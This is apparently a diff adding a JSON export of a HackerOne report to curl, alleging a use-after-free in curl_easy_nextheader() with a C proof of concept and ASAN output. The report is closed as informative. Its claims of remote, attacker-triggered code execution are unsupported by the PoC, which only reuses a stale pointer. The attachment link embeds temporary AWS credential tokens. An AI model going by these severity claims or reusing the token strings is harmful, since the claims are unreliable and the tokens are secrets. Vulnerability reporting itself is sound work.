@@ -1,0 +1,124 @@
+{
+  "id": 3508701,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA4NzAx",
+  "url": "https://hackerone.com/reports/3508701",
+  "title": "Use-After-Free in curl_easy_nextheader when reusing header handle across requests",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2026-01-13T11:39:25.370Z",
+  "submitted_at": "2026-01-13T11:39:25.595Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "adce626q",
+    "url": "/adce626q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0cvr2syvuz2x401o452dtldxakkj/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-14T09:23:05.743Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-01-14T09:23:05.494Z",
+  "team_member_agreed_on_going_public_at": "2026-01-14T00:03:57.253Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": ").\nThe API returns struct curl_header objects that internally reference libcurl-owned linked list nodes. When a new request is performed on the same CURL* handle, libcurl frees and rebuilds the internal header list, but previously returned struct curl_header objects remain valid to the application and are still accepted as input.\n\nPassing such a stale header object back to curl_easy_nextheader() causes libcurl to dereference a freed internal pointer, leading to a heap use-after-free.\n\nThis is a memory safety vulnerability reachable through normal API usage and attacker-controlled HTTP responses.\n\nAffected Versions\n\nAll libcurl versions that include the Headers API (curl_easy_header, curl_easy_nextheader)\n\nReproduced on:\n\nKali Linux libcurl (January 2026)\n\nLikely all current supported versions\n\nFile:\nlib/headers.c\n\nTechnical Analysis\nVulnerable Design\n\ncurl_easy_nextheader() exposes struct curl_header to the application:\n\nstruct curl_header {\n  const char *name;\n  const char *value;\n  unsigned int amount;\n  unsigned int index;\n  unsigned int origin;\n  void *anchor;   /* internal Curl_llist_node */\n};\n\n\nThe anchor field stores a pointer to libcurl’s internal linked list node:\n\ncopy_header_external(..., struct Curl_llist_node *e, ...) {\n  h->anchor = e;\n}\n\n\nLater, when a new request is performed, libcurl frees the internal header list:\n\nCurl_headers_cleanup(struct Curl_easy *data) {\n  for(e = Curl_llist_head(&data->state.httphdrs); e; e = n) {\n    struct Curl_header_store *hs = Curl_node_elem(e);\n    curlx_free(hs);\n  }\n}\n\n\nHowever, previously returned struct curl_header objects remain valid in user code and can still be passed back to:\n\ncurl_easy_nextheader(CURL *easy, unsigned int type, int request,\n                     struct curl_header *prev)\n\n\nThis function blindly dereferences:\n\npick = prev->anchor;\npick = Curl_node_next(pick);\n\n\nIf the header list has been freed and rebuilt, prev->anchor now points to freed heap memory → use-after-free.\n\nThere is:\n\nNo invalidation of old struct curl_header\n\nNo generation tracking\n\nNo lifetime enforcement\n\nThe API contract does not state that header handles become invalid after a new request.\n\nProof of Concept\n#include <stdio.h>\n#include <curl/curl.h>\n\nint main(void) {\n  CURL *curl = curl_easy_init();\n  if(!curl) return 1;\n\n  struct curl_header *h = NULL;\n\n  /* First request */\n  curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n  curl_easy_perform(curl);\n\n  /* Obtain and store a header */\n  h = curl_easy_nextheader(curl, CURLH_HEADER, -1, NULL);\n  printf(\"saved header: %s: %s\\n\", h->name, h->value);\n\n  /* Second request (frees and rebuilds internal header list) */\n  curl_easy_setopt(curl, CURLOPT_URL, \"https://httpbin.org/get\");\n  curl_easy_perform(curl);\n\n  /* Reuse stale header handle */\n  printf(\"calling nextheader with stale prev...\\n\");\n  struct curl_header *h2 = curl_easy_nextheader(curl, CURLH_HEADER, -1, h);\n  if(h2)\n    printf(\"next header: %s: %s\\n\", h2->name, h2->value);\n\n  curl_easy_cleanup(curl);\n  return 0;\n}\n\nBuild and Run\ngcc -fsanitize=address -g poc.c -lcurl -o poc\n./poc\n\nASAN Output (Excerpt)\nERROR: AddressSanitizer: heap-use-after-free\nREAD of size 13\nfreed by:\n  libcurl.so Curl_headers_cleanup\nallocated by:\n  libcurl.so Curl_headers_push\n\n\nThis confirms that curl_easy_nextheader() dereferences freed memory.\n\n## Impact\n\nSecurity Impact\n\nA malicious HTTP server can influence response headers and trigger a heap use-after-free in applications using libcurl’s Headers API when multiple requests are performed on the same CURL* handle.\n\nThis can lead to:\n\nProcess crash (Denial of Service)\n\nHeap memory corruption\n\nPotential code execution depending on allocator state and surrounding memory\n\nThe vulnerability:\n\nIs reachable through documented public API\n\nIs triggered by attacker-controlled HTTP responses\n\nDoes not require MITM",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5220506,
+      "file_name": "poc.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j2qdvgsjxrabe3fc5o1wn135epz5?response-content-disposition=attachment%3B%20filename%3D%22poc.c%22%3B%20filename%2A%3DUTF-8%27%27poc.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5JYZBZC%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162604Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQCe5nk9F0p4ASik%2BBggriqpXnK5btyRVhhg04sMh1dd3gIgcDB1p5Rj%2B%2FHfce26Us%2FJC0Q77sMKgCyn1zkwMiF7AHMqsQUIQRADGgwwMTM2MTkyNzQ4NDkiDEQlkKODOywJ05pWKSqOBeUnllyFWPJIQQm9oyAeBye5VhzAlLy0aycW9sXAr68efi6Z6Y2kcWO264RhnpIoQW02r4NPHKFIJeqRJnqfl%2BGviMOvH%2BEsVbg7YjKkzQALaMXADft1pN0WeAxTyzrwyJbCnRRcrrI5QdLf0xp5k0MSDS5dYJzrZyRxABEBzEmgmCG8%2FA7DJT0SwELKgSHgDK0IpreKLHpaWE0jLWMC4XToxB9MQ9HCQ75xZ5pjKvmA6i5tyPMYvIxhHzb8S%2FaOY5brAxX250%2BP%2Fm3hiz7MCDoVHnf%2FRa3Q431svGGk4qqH26fZcccX8%2Fzor51dFi1pBmhQG0uRLJUJg2GuidECCgrWmp8LoCT9pnP1WyILIyJj4v0fheXOY7ibOIAKhEWx2FCFG7RBrb%2BuUD48HhkIJecqioNeOU0paOySAQ5AukM1jZ1ZlTr0D%2FxSRUU7CZklglN%2B6l4hLXYkj68kWVwDCA1%2FBWbkvmiL9oe65vupErGvZFtlsadmMLjjHTiby%2F7IHeLteTfDQ0huqdzV6JnrijSlLfG8VqEhlyxmV4KHhu7btnIeu7KFb4RWXBsYzkiYsFoigjJV60RkE6jnHehVeKt6j76jbQusYAGMd61ST4DIPQ3oeITGfnICzyVSpSOxK6iXSZ7jSdOIDAj64qHF5lFjUhdZU7z9uWjVv3pxzOYXCWvhhmB2M4qCFk%2BqaO4k1PnYXqwyJ3rqcIdKLp1wbMls%2BRMSrx%2F6JBy4ezXrOY2iJ1%2F6nt%2FdaEQQUNEOSh%2FXVitTFoKh5pSF1bx2yA8pVjGwLfZ3K%2F%2FVcw63gRtvk%2FppidsP3Wlw2HrAnYI8Dl0ffOLxK9SqtlnuP1Vmp0RKuBxG4CFTbSY6L5TBc%2FxBazCGvNjPBjqxAW8G3lkIwSNymypp0GKvUFtDI0RApXFQhHEUr3thtlOwMtoH3TBYaWnMkdcVN93h9xo9Ld34%2BGUTB4lHlU7tUZJt9zS7mQnuJPn07zvifVerN9b45LzPKp%2BamB8lkmC1U6yUUsvrsbBgpYlo%2FvT9LId37SuGCFDjrrayKxiOjk2LpK9Op2wagBBxO3GN8sUSOXWjbTdf4mwBdPZqNlxiwJdxFMbFoTCoEAHki6qGnY7rLg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d8bc8904185c482341fe39cf3e2bd561031ac4debd5c4d6de6ed4dd526789926",
+      "file_size": 818,
+      "type": "text/x-csrc",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "trptt",
+    "2026",
+    "mr-inspector",
+    "essax",
+    "adce626q",
+    "stationarydev37",
+    "hunta",
+    "pentets2"
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
